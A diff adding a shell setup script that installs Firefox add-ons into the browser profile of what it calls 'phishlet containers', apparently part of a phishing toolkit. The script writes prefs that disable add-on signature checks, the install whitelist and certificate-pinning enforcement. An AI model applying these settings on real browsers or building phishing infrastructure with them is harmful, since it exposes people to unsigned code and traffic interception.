@@ -1,0 +1,64 @@
+#!/bin/sh
+# Install Firefox addons into the profile for all phishlet containers.
+# Runs as cont-init.d script (after 55-firefox.sh and 56-firefox-set-prefs-from-env.sh).
+
+ADDON_DIR="/config/profile/extensions"
+mkdir -p "$ADDON_DIR"
+
+# CRITICAL: Write signing bypass into prefs.js DIRECTLY (not user.js).
+# Firefox reads prefs.js before validating extensions. user.js is too late.
+# Also set autoDisableScopes and enabledScopes.
+# Append to existing prefs.js created by 56-firefox-set-prefs-from-env.sh
+cat >> /config/profile/prefs.js <<'EOF'
+user_pref("extensions.autoDisableScopes", 0);
+user_pref("extensions.enabledScopes", 15);
+user_pref("xpinstall.signatures.required", false);
+user_pref("extensions.experiments.enabled", true);
+user_pref("xpinstall.whitelist.required", false);
+user_pref("security.cert_pinning.enforcement_level", 0);
+EOF
+
+# Also write to user.js as backup
+cat > /config/profile/user.js <<'EOF'
+user_pref("extensions.autoDisableScopes", 0);
+user_pref("extensions.enabledScopes", 15);
+user_pref("xpinstall.signatures.required", false);
+user_pref("extensions.experiments.enabled", true);
+user_pref("xpinstall.whitelist.required", false);
+EOF
+
+# Install each addon by extracting its GUID from the XPI manifest
+for xpi in /opt/addons/*.xpi; do
+  [ -f "$xpi" ] || continue
+  bname="$(basename "$xpi")"
+  guid=$(python3 -c "
+import zipfile, json
+try:
+    with zipfile.ZipFile('$xpi') as z:
+        m = json.load(z.open('manifest.json'))
+        g = m.get('browser_specific_settings', {}).get('gecko', {}).get('id', '')
+        print(g)
+except Exception:
+    print('')
+" 2>/dev/null)
+
+  if [ -n "$guid" ]; then
+    echo "[install-addons] installing $bname as $guid"
+    cp "$xpi" "$ADDON_DIR/${guid}.xpi"
+  else
+    fallback_id="${bname%.xpi}"
+    echo "[install-addons] no gecko.id in $bname, using fallback ID: $fallback_id"
+    cp "$xpi" "$ADDON_DIR/${fallback_id}.xpi"
+  fi
+done
+
+# Fix ownership so Firefox (running as app user) can read the files
+chown -R app:app "$ADDON_DIR"
+chown app:app /config/profile/user.js /config/profile/prefs.js 2>/dev/null
+
+# Register addons in extensions.json so Firefox loads them on startup
+python3 /opt/patch_extensions_json.py 2>/dev/null
+
+echo "[install-addons] contents of $ADDON_DIR:"
+ls -la "$ADDON_DIR"
+exit 0
